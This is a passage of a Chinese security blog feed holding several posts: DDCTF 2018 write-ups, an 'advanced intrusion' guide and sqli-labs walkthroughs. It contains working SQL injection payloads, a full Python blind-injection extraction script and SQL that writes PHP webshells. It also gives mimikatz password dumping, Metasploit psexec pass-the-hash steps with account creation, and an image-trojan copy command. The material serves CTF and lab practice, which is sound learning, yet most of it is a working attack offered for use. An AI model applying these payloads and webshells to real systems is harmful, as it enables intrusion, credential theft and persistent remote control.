uploads的位置，将file_uploads设置成Off。<br>2.限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。<br>3.检查上传文件的类型<br>4.检查上传文件的内容<br>5.上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。</p><h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><p>命令：</p><pre><code>copy /b 1.jpg+2.php</code></pre><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DDCTF三道小结</title>
      <link href="/archis/a7a61e20/"/>
      <url>/archis/a7a61e20/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF三道小结"><a href="#DDCTF三道小结" class="headerlink" title="DDCTF三道小结"></a>DDCTF三道小结</h1><p>太菜了 就只能做出三道题，继续加油，明年再战</p><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd</p><p>进制转换，先将16进制转换为10进制，再对128求余，剩下的结果转换为字符。</p><pre><code class="python">ascii=&quot;212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253&quot;newlist=ascii.split()newlist2=ascii.split()for i in range(90,160):    for j in range(len(newlist)):        newlist2[j]=int(newlist[j])-i    for k in newlist2:        print chr(int(k)),    print &quot;&quot;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804192226_410.png" alt=""></p><p> DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804192234_752.png" alt=""></p><p>分析得到有一个压缩包</p><p>foremost出来得到zip，</p><p>解压密码在windows.jpg属性的备注</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804192236_14.png" alt=""></p><p>Pactera</p><p>（插曲我一开始以为是crc32攻击）逃 </p><p>解压得到file</p><p>根据提示进行字符频度统计即可得到flag。</p><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><table><thead><tr><th>词</th><th>频次</th><th>频率 %</th><th></th></tr></thead><tbody><tr><td>1</td><td>D</td><td>3950</td><td>12.9381</td></tr><tr><td>2</td><td>C</td><td>1900</td><td>6.2234</td></tr><tr><td>3</td><td>T</td><td>1850</td><td>6.0596</td></tr><tr><td>4</td><td>F</td><td>1800</td><td>5.8958</td></tr><tr><td>5</td><td>{</td><td>1750</td><td>5.7321</td></tr><tr><td>6</td><td>t</td><td>1700</td><td>5.5683</td></tr><tr><td>7</td><td>u</td><td>1650</td><td>5.4045</td></tr><tr><td>8</td><td>0</td><td>1600</td><td>5.2407</td></tr><tr><td>9</td><td>k</td><td>1550</td><td>5.077</td></tr><tr><td>10</td><td>U</td><td>1500</td><td>4.9132</td></tr><tr><td>11</td><td>a</td><td>1450</td><td>4.7494</td></tr><tr><td>12</td><td>n</td><td>1400</td><td>4.5857</td></tr><tr><td>13</td><td>s</td><td>1350</td><td>4.4219</td></tr><tr><td>14</td><td>h</td><td>1300</td><td>4.2581</td></tr><tr><td>15</td><td>i</td><td>1250</td><td>4.0943</td></tr><tr><td>16</td><td>y</td><td>1200</td><td>3.9306</td></tr><tr><td>17</td><td>e</td><td>1150</td><td>3.7668</td></tr><tr><td>18</td><td>!</td><td>1100</td><td>3.603</td></tr><tr><td>19</td><td>}</td><td></td></tr></tbody></table><p>DDCTF{tu0kUanshiye!}</p><h2 id="Web-1-数据库的秘密"><a href="#Web-1-数据库的秘密" class="headerlink" title="Web 1 数据库的秘密"></a>Web 1 数据库的秘密</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804212006_929.png" alt=""></p><p>使用插件modify headers加一个x-forward-for: 123.232.23.245</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804212005_33.png" alt=""></p><p>打开题目是三个搜索框和一个数据表格，分析form表单发现隐藏一处所以更改本地复现进行注入</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804220047_85.png" alt=""></p><p>发现是bool盲注，并用burp fuzz一下</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804220050_110.png" alt=""></p><p>发现union，database（）都被过滤</p><p>准语句：0’&amp;&amp;if(ascii(substr((select version()),1,1))&gt;0,1,0)#</p><p>得到库名：0’ &amp;&amp; if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;0,1,0)#：DDCTF</p><p>得到表名0’&amp;&amp;if(ascii(substr((select table_name from information_schema.tables where table_schema=’ddctf’))&gt;0,1,0)#：ctf_key1</p><p>得到字段名 0’&amp;&amp;if(ascii(substr((select column_name from information_schema.columns where table_name=’ctf_key1’ limit 0,1),9,1))&gt;0,1,0)#：secvalue</p><p>得到flag  0’&amp;&amp;if(ascii(substr((select secvalue from ctf_key1 limit 0,1),1,1))&gt;0,1,0)#   ====0’ &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),1,1)=’d’#</p><p>DDCTF{IKIDLHNZMKFUDEQE}</p><blockquote><p><strong>substr()函数</strong></p><pre><code>Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length)string substr(string, start, length)参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</code></pre></blockquote><p>另附大佬一的奇特方法直接显注：</p><p>此waf为假waf 使用超过100个参数可以绕过</p><p><a href="http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/" target="_blank" rel="external">http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/</a></p><p>大佬二sqlmap一把梭：</p><p>对于此题，采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br><code>proxy.php</code> 代码如下：</p><pre><code>&lt;?php@$id = $_REQUEST[&#39;id&#39;];@$title = $_REQUEST[&#39;title&#39;];@$author = $_REQUEST[&#39;author&#39;];@$date = $_REQUEST[&#39;date&#39;];$time = time();$sig = sha1(&#39;id=&#39;.$id.&#39;title=&#39;.$title.&#39;author=&#39;.$author.&#39;date=&#39;.$date.&#39;time=&#39;.$time.&#39;adrefkfweodfsdpiru&#39;);$ch = curl_init();$post = [    &#39;id&#39; =&gt; $id,    &#39;title&#39; =&gt; $title,    &#39;author&#39; =&gt; $author,    &#39;date&#39; =&gt; $date,];curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);curl_setopt($ch, CURLOPT_HTTPHEADER, array(    &#39;X-Forwarded-For: 123.232.23.245&#39;,    ));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $post);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, true);$ch_out = curl_exec($ch);$ch_info = curl_getinfo($ch);$header = substr($ch_out, 0, $ch_info[&#39;header_size&#39;]);$body = substr($ch_out, $ch_info[&#39;header_size&#39;]);http_response_code($ch_info[&#39;http_code&#39;]);//header($header);//echo $header;echo $body;</code></pre><p>sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于 <code>author</code>，获得 flag。</p><blockquote><p><code>sqlmap.py -u &#39;http://127.0.0.1/proxy.php?author=admin&#39; --dump</code></p></blockquote><p><img src="https://clannad.me/image/web-1.png" alt="Web-1"></p><p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a></p><p><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>高级入侵</title>
      <link href="/archis/1f382107/"/>
      <url>/archis/1f382107/</url>
      
        <content type="html"><![CDATA[<h1 id="高级入侵"><a href="#高级入侵" class="headerlink" title="高级入侵"></a>高级入侵</h1><h3 id="Windows权限分析与密码安全测试"><a href="#Windows权限分析与密码安全测试" class="headerlink" title="Windows权限分析与密码安全测试"></a>Windows权限分析与密码安全测试</h3><p>1.windows xp写入管理员权限<br>2.windows 2003默认权限<br>—–默认只安装静态HTTP服务器<br>—–增强的文件访问控制<br>—–父目录被禁用<br>—–坚持最小特权原则</p><p>注意给users组只有读取和运行权限</p><p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p><p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p><h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091859_724.png" alt=""></p><p>2.webshell  </p><p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p><p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091927_696.png" alt=""></p><p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091956_886.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091957_230.png" alt=""></p><p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p><p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p><p>6.使用Ophcrack（kali）破解系统hash密码</p><h3 id="获取Webshell方法总结"><a href="#获取Webshell方法总结" class="headerlink" title="获取Webshell方法总结"></a>获取Webshell方法总结</h3><h4 id="主要通过谷歌搜索cms漏洞"><a href="#主要通过谷歌搜索cms漏洞" class="headerlink" title="主要通过谷歌搜索cms漏洞"></a>主要通过谷歌搜索cms漏洞</h4><p>phpcms discuz phpwind</p><h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p><pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;</code></pre><p>php爆路径方法收集<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092306_259.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092322_426.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092325_134.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092326_398.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092327_366.png" alt=""></p><p>tomcat获取<br>weblogic获取<br>jboss获取</p><h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p><p>服务器端口被修改如何查找</p><p>cmd<br>tasklist /svc 寻找TermService</p><p>netstat -ano<br>查看所有端口</p><p>服务器处于内网如何连接</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>信息收集</title>
      <link href="/archis/312e3d12/"/>
      <url>/archis/312e3d12/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803241742_133.png" alt=""></p><p>1、robots.txt<br>2、网站备份压缩文件<br>    可能为.rar、zip、.7z、.tar.gz、.bak、.txt、.swp等等，以及和网站信息有关的文件名www.rar、web、rar等等<br>3、Git导致文件泄露<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803241744_967.png" alt=""><br>4、DS_store导致文件泄露<br>5、SVN导致文件泄露<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><pre><code>1) 漏洞利用工具： Seay SVN漏洞利用工具2) 添加网站url</code></pre><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br>6、WEB-INF/web.xml泄露<br>        6.1、环境搭建<br>        6.2、访问页面<br>        6.3、扫描<br>        6.4、验证结果<br>7、Zoomeye搜索引擎使用<br>        7.1、搜索规则<br>        7.2、搜索技巧<br>        7.3、实战搜索<br>8、bing搜索引擎使用<br>9、Fofa搜索<br>10、站长工具<br>        10.1、站长工具Whois<br>        10.2、seo综合查询<br>        10.3、站长工具tool</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs less11-15</title>
      <link href="/archis/ced895c1/"/>
      <url>/archis/ced895c1/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less11-15"><a href="#sqli-labs-less11-15" class="headerlink" title="sqli-labs less11-15"></a>sqli-labs less11-15</h1><p>[TOC]</p><h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p>uname=1’ or 1=1 # &amp;passwd=x</p><h3 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h3><p>uname=1”) or 1=1 # &amp;passwd=x</p><h3 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h3><p>username：1’<br>Password： （随便输）<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘12’) LIMIT 0,1’ at line 1<br>‘) 我们可以知道程序对 id 进行了 ‘) 的处理。</p><p>uname=1’) or 1=1 # &amp;passwd=x</p><h3 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h3><p>uname=admin”and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><p>###less15POST型基于时间盲注<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Subm<br>it</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>uname=”) or 1=1#&amp;passwd=x<br>或<br>uname=”) or if(length(database())=8,1,sleep(2))#&amp;passwd=x</p><h3 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h3><p>Username：admin<br>Password：1’ You have an error in your SQL syntax; check the manual that corresponds<br>to your MySQL server version for the right syntax to use near ‘admin’’<br>at line 1<br>可以看到 admin’’ 说明在对密码的处理过程中使用的是 ‘’ 。<br>接下来利用盲注进行注入。<br>这里首先演示一下报错类型的盲注。<br>uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>Less-18 Header Injection- Error Based- string<br>在header里的User-Agent后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-19 Header Injection- Referer- Error Based- string<br>在header里的Referer后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-20 Cookie Injection- Error Based- string<br>在header里的Cookie附上payload：<br>uname=admin’ order by 3#<br>uname=x’ union select 1,database(),3#<br>uname=x’ union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-21 Cookie Injection- Error Based- complex - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin’) order by 3#<br>uname=x’) union select 1,database(),3#<br>uname=x’) union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-22 Cookie Injection- Error Based- Double Quotes - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin” order by 3#<br>uname=x” union select 1,database(),3#<br>uname=x” union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs  less7-10</title>
      <link href="/archis/9a0d7777/"/>
      <url>/archis/9a0d7777/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less7-10"><a href="#sqli-labs-less7-10" class="headerlink" title="sqli-labs  less7-10"></a>sqli-labs  less7-10</h1><p>[TOC]</p><h3 id="less-7：GET-基于错误-双引号-文件导出"><a href="#less-7：GET-基于错误-双引号-文件导出" class="headerlink" title="less-7：GET-基于错误-双引号-文件导出"></a>less-7：GET-基于错误-双引号-文件导出</h3><p>练习mysql的文件写入。我们的目的是将一句话木马写入到网站的Less-7目录下</p><p>先去用 ‘ “  之类的测试<br>发现，用 “ 返回页面无变化，用 ‘ 返回页面出错，说明这个结构肯定是带 ‘ 的。</p><p>‘ 的返回页面为：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803172221_893.png" alt=""></p><p>但是绝对和单引号有关，所以试试 ‘)  ,  ‘))</p><p>‘) 也错了</p><p>‘)) 返回页面正常！！</p><p>说明sql语句应该是这样：</p><pre><code> select * from table where id = ((&#39;input&#39;));</code></pre><p><a href="http://43.247.91.228:84/Less-7/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-7/?id=1</a>‘)) union select 1,2,”&lt;?php @eval($_POST[‘cmd’]); ?&gt;” into outfile “/var/www/html/dd1.php”</p><h3 id="less-8：GET-基于布尔类型-盲注"><a href="#less-8：GET-基于布尔类型-盲注" class="headerlink" title="less-8：GET-基于布尔类型-盲注"></a>less-8：GET-基于布尔类型-盲注</h3><p>发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了<br><a href="http://43.247.91.228:84/Less-8/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-8/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;64 %23  </p><p>放一个脚本：</p><pre><code># coding: utf-8import urllib2import urllibsuccess_str = &quot;You are in&quot;getTable = &quot;users&quot;index = &quot;0&quot;url = &quot;http://43.247.91.228:84/Less-8/?id=1&quot;database = &quot;database()&quot;selectDB = &quot;select database()&quot;selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;# 获取字符串的长度def getLengthOfString(payload, string):    # 猜长度    lengthLeft = 0    lengthRigth = 0    guess = 10    # 确定长度上限，每次增加5    while 1:        # 如果长度大于guess        if getLengthResult(payload, string, guess) == True:            # 猜测值增加5            guess = guess + 5        else:            lengthRigth = guess            break            # print &quot;lengthRigth: &quot; + str(lengthRigth)    # 二分法查长度    mid = (lengthLeft + lengthRigth) / 2    while lengthLeft &lt; lengthRigth - 1:        # 如果长度大于等于mid        if getLengthResult(payload, string, mid) == True:            # 更新长度的左边界为mid            lengthLeft = mid        else:            # 否则就是长度小于mid            # 更新长度的右边界为mid            lengthRigth = mid            # 更新中值        mid = (lengthLeft + lengthRigth) / 2        # print lengthLeft, lengthRigth    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8    return lengthLeft# 获取名称def getName(payload, string, lengthOfString):    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符    tmp = &#39;&#39;    for i in xrange(1, lengthOfString + 1):        left = 32        right = 127        mid = (left + right) / 2        while left &lt; right - 1:            # 如果该字符串的第i个字符的ascii码大于等于mid            if getResult(payload, string, i, mid) == True:                # 则更新左边界                left = mid                mid = (left + right) / 2            else:                # 否则该字符串的第i个字符的ascii码小于mid                # 则更新右边界                right = mid                # 更新中值            mid = (left + right) / 2        tmp += chr(left)    return tmp# 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload  length：猜测的长度def getLengthResult(payload, string, length):    finalUrl = url + urllib.quote(payload % (string, length))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的asciidef getResult(payload, string, pos, ascii):    finalUrl = url + urllib.quote(payload % (string, pos, ascii))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False# 注入def inject():    # 猜数据库长度    lengthOfDBName = getLengthOfString(lengthPayload, database)    print &quot;length of DBname: &quot; + str(lengthOfDBName)    # 获取数据库名称    DBname = getName(asciiPayload, selectDB, lengthOfDBName)    print &quot;current database:&quot; + DBname    # 获取数据库中的表的个数    # print selectTableCountPayload    tableCount = getLengthOfString(selectTableCountPayload, DBname)    print &quot;count of talbe:&quot; + str(tableCount)    # 获取数据库中的表    for i in xrange(0, tableCount):        # 第几个表        num = str(i)        # 获取当前这个表的长度        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)        print &quot;current table length:&quot; + str(tableNameLength)        # 获取当前这个表的名字        selectTableName = selectTable % (DBname, i)        tableName = getName(asciiPayload, selectTableName, tableNameLength)        print tableName    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;    # print selectColumnCountPayload    # 获取指定表的列的数量    columnCount = getLengthOfString(selectColumnCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)    # 获取该表有多少行数据    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;    dataCount = getLengthOfString(dataCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)    data = []    # 获取指定表中的列    for i in xrange(0, columnCount):        # 获取该列名字长度        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(            i) + &quot;,1)&gt;=%d #&quot;        # print selectColumnNameLengthPayload        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)        print &quot;current column length:&quot; + str(columnNameLength)        # 获取该列的名字        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;        selectColumnName = selectColumn % (getTable, i)        # print selectColumnName        columnName = getName(asciiPayload, selectColumnName, columnNameLength)        print columnName        tmpData = []        tmpData.append(columnName)        # 获取该表的数据        for j in xrange(0, dataCount):            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;            # print columnDataLengthPayload            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)            # print columnDataLength            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;            columnData = getName(asciiPayload, selectData, columnDataLength)            # print columnData            tmpData.append(columnData)        data.append(tmpData)        # print data    # 格式化输出数据    # 输出列名    tmp = &quot;&quot;    for i in xrange(0, len(data)):        tmp += data[i][0] + &quot;   &quot;    print tmp    # 输出具体数据    for j in xrange(1, dataCount + 1):        tmp = &quot;&quot;        for i in xrange(0, len(data)):            tmp += data[i][j] + &quot;   &quot;        print tmpif __name__ == &quot;__main__&quot;:    print &quot;-----------inject starting----------&quot;    inject()</code></pre><p>与less5相似</p><h3 id="less-9：GET-基于时间类型-盲注"><a href="#less-9：GET-基于时间类型-盲注" class="headerlink" title="less-9：GET-基于时间类型-盲注"></a>less-9：GET-基于时间类型-盲注</h3><p>基于时间的盲注，只用修改一下上面的python脚本即可实现，加个时间判断，payload：<br><a href="http://127.0.0.1/sql/Less-9/?id=1" target="_blank" rel="external">http://127.0.0.1/sql/Less-9/?id=1</a>‘ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(2)) %23<br>这里if判断为真，所以会执行sleep(2)，查询操作会有明显的延迟。如果为假，即不正确，那么就不会执行sleep(2)，页面回显会明显的很快。<br>在了解了这些基本知识之后，我们使用一下payload来sql注入<br><a href="http://192.168.1.158/sqli-labs/Less-8/?id=1‘" target="_blank" rel="external">http://192.168.1.158/sqli-labs/Less-8/?id=1‘</a> and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第10关只要把前面两关payload部分的单引号改成双引号即可。<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="external">http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs5-6(盲注)</title>
      <link href="/archis/4303333d/"/>
      <url>/archis/4303333d/</url>
      
